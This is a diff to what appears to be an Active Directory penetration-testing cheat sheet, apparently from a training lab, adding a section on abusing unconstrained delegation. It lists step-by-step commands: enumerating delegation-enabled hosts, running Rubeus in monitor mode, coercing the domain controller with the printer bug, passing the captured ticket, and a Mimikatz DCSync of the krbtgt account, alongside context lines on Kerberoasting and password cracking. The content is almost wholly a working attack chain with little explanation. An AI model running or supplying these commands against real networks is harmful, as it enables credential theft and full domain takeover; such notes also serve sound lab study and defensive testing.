@@ -308,7 +308,29 @@ Rubeus.exe kerberoast /outfile:targetedhashes.txt
 john.exe--wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
 ```
 
+Unconstrained Delegation
+```pwoershell
+#Unconstrained delegation in Active Directory is a feature that allows a server or service to impersonate users across the entire network after they have authenticated to that server. Essentially, if a user authenticates to a machine with unconstrained delegation enabled, that machine can act on behalf of that user and access other services as if it were the user.
 
+#1- Enum computers & Users which have unconstrained delegation enabled
+Get-DomainComputer-UnConstrained  #powerview
+Get-ADComputer-Filter {TrustedForDelegation-eq $True}  #AD Module
+Get-ADUser-Filter {TrustedForDelegation-eq $True}  #AD Module
+
+#make usre you have compromised the computer that having unconstrained delegation. expected attack path -> over pass the hash after extracting the credentials --> find local admin access on another machine --> if yes drop rubeus to the other machine and run it as monitor mode.
+
+#2- enable monitor mode
+Rubeus.exe monitor /interval:5 /nowrap
+
+#3- force the DC to connect to the machine
+MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+
+#4- Pass the Ticket
+Rubeus.exe ptt /tikcet:do..[]..TA==
+
+#5- you can use DCSync attack
+Invoke-Mimikatz-Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
 
 
 
